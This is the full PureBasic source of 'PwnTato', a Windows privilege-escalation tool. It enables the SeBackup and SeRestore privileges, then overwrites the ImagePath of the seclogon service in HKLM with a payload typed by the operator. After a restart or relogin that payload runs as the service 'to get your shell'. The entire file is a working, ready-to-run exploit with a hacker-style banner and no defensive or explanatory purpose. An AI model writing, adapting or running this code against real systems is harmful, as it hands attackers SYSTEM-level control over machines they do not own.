; Constants from Windows headers
#FILE_DEVICE_FILE_SYSTEM         = $00000009
#METHOD_BUFFERED                 = 0
#FILE_ANY_ACCESS                 = 0
#FILE_SPECIAL_ACCESS             = (#FILE_ANY_ACCESS)
#FILE_FLAG_OPEN_REPARSE_POINT    = $00200000

; Registry constants
#KEY_WOW64_64KEY = $0100

; Token Access
#TOKEN_QUERY              = $0008
#TOKEN_ADJUST_PRIVILEGES = $0020

; TOKEN_PRIVILEGES structure
Structure LUID
  LowPart.l
  HighPart.l
EndStructure

Structure LUID_AND_ATTRIBUTES
  Luid.LUID
  Attributes.l
EndStructure

Structure TOKEN_PRIVILEGES
  PrivilegeCount.l
  Privileges.LUID_AND_ATTRIBUTES[1]
EndStructure

; Console helpers
Procedure success()
  ConsoleColor(10, 0) : Print("[+] ") : ConsoleColor(7, 0)
EndProcedure

Procedure fail()
  ConsoleColor(12, 0) : Print("[-] ") : ConsoleColor(7, 0)
EndProcedure

Procedure warn()
  ConsoleColor(6, 0)  : Print("[!] ") : ConsoleColor(7, 0)
EndProcedure

Procedure check()
  ConsoleColor(13, 0) : Print("[*] ") : ConsoleColor(7, 0)
EndProcedure

; Enable a single privilege by name
Procedure EnablePrivilege(privName.s)
  Protected TokenHandle, TP.TOKEN_PRIVILEGES
  If OpenProcessToken_(GetCurrentProcess_(), #TOKEN_ADJUST_PRIVILEGES | #TOKEN_QUERY, @TokenHandle)
    TP\PrivilegeCount = 1
    TP\Privileges[0]\Attributes = #SE_PRIVILEGE_ENABLED
    If LookupPrivilegeValue_(0, @privName, @TP\Privileges[0]\Luid)
      If AdjustTokenPrivileges_(TokenHandle, #False, @TP, SizeOf(TOKEN_PRIVILEGES), #Null, #Null)
        success() : PrintN(privName + " enabled.")
      Else
        fail() : PrintN("Failed to enable privilege: " + privName)
      EndIf
    Else
      fail() : PrintN("Failed to lookup LUID for: " + privName)
    EndIf
    CloseHandle_(TokenHandle)
  Else
    fail() : PrintN("Failed to open process token.")
  EndIf
EndProcedure

; Check if privilege is present (enabled or disabled)
Procedure HasPrivilege(privName.s)
  Protected TokenHandle, Luid.LUID, TP.TOKEN_PRIVILEGES, ReturnSize.l
  If OpenProcessToken_(GetCurrentProcess_(), #TOKEN_QUERY, @TokenHandle)
    If LookupPrivilegeValue_(0, @privName, @Luid)
      TP\PrivilegeCount = 1
      TP\Privileges[0]\Luid = Luid
      If GetTokenInformation_(TokenHandle, 3, @TP, SizeOf(TOKEN_PRIVILEGES), @ReturnSize)
        If TP\Privileges[0]\Attributes & #SE_PRIVILEGE_ENABLED
          success() : PrintN(privName + " is present and ENABLED.")
        Else
          warn() : PrintN(privName + " is present but DISABLED.")
        EndIf
      EndIf
    EndIf
    CloseHandle_(TokenHandle)
  EndIf
EndProcedure

; Enable both privileges
Procedure EnableNecessaryPrivileges()
  check() : PrintN("Checking privileges...")
  HasPrivilege("SeBackupPrivilege")
  HasPrivilege("SeRestorePrivilege")

  check() : PrintN("Trying to enable privileges...")
  EnablePrivilege("SeBackupPrivilege")
  EnablePrivilege("SeRestorePrivilege")
EndProcedure

; Write registry key (64-bit view)
Procedure.l WriteRegKey(OpenKey.l, SubKey.s, KeySet.s, KeyValue.s)
  Protected hKey.l, Result = 0, Datasize.l = Len(KeyValue)
  If RegCreateKeyEx_(OpenKey, @SubKey, 0, #Null, 0, #KEY_WRITE | #KEY_WOW64_64KEY, 0, @hKey, 0) = 0
    If RegSetValueEx_(hKey, @KeySet, 0, #REG_EXPAND_SZ, @KeyValue, Datasize) = 0
      Result = 1
    EndIf
    RegCloseKey_(hKey)
  EndIf
  ProcedureReturn Result
EndProcedure

; Read registry key (64-bit view)
Procedure.s ReadRegKey(OpenKey.l, SubKey.s, ValueName.s)
  Protected hKey.l, KeyValue.s = Space(255), Datasize.l = 255
  If RegOpenKeyEx_(OpenKey, @SubKey, 0, #KEY_READ | #KEY_WOW64_64KEY, @hKey) = 0
    If RegQueryValueEx_(hKey, @ValueName, 0, 0, @KeyValue, @Datasize) = 0
      KeyValue = Left(KeyValue, Datasize - 1)
    Else
      KeyValue = "Error Reading Key"
    EndIf
    RegCloseKey_(hKey)
  Else
    KeyValue = "Error Opening Key"
  EndIf
  ProcedureReturn KeyValue
EndProcedure

; Main
OpenConsole()
ConsoleTitle("PwnTato 1.0")
ClearConsole()
EnableGraphicalConsole(0)

; Banner
ConsoleColor(14, 0)
PrintN(#TAB$ + "    ██▒▒████████████████▒▒██")
PrintN(#TAB$ + "    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██")
ConsoleColor(10, 0)
PrintN(#TAB$ + "              v1.0")
ConsoleColor(14, 0)
Print(#TAB$ + "       PwnTato by ")
ConsoleColor(12, 0)
PrintN("@duty1g" + #CRLF$)
ConsoleColor(7, 0)

; Enable and check privileges
EnableNecessaryPrivileges()

; Prompt
warn()
Print("Enter your seclogon payload: ")
payload$ = Input()

If WriteRegKey(#HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services\seclogon", "ImagePath", payload$)
  check() : Print("Checking written key..." + #CRLF$)
  If ReadRegKey(#HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services\seclogon", "ImagePath") = payload$
    success() : Print("Done :) " + #CRLF$)
    warn()   : Print("Relogin or restart service to get your shell" + #CRLF$)
  Else
    fail() : Print("Mismatch in registry value readback." + #CRLF$)
  EndIf
Else
  fail() : Print("Failed to write to registry." + #CRLF$)
EndIf

CloseConsole()
